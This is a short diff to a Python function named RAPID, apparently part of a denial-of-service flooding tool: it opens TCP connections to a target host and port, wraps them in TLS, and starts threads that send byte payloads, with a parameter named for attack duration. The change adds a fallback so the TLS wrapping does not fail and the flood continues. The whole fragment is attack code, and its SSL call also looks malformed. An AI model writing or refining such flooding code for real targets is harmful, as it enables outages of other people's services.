@@ -15,7 +15,8 @@ def RAPID(target,duration_sec_attack_dude, byt, byt2):
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((str(target['host']),int(target['port'])))
             s.connect_ex((str(target['host']),int(target['port'])))
-            ssl_socket = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target['host'])
+            try:ssl_socket = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target['host'])
+            except:ssl_socket  = ssl.SSLContext().wrap_socket(s,server_hostname=target['host'])
             threading.Thread(target=RAPID_SENDER,args=(byt,byt2,ssl_socket)).start()
         except Exception as e:pass
 
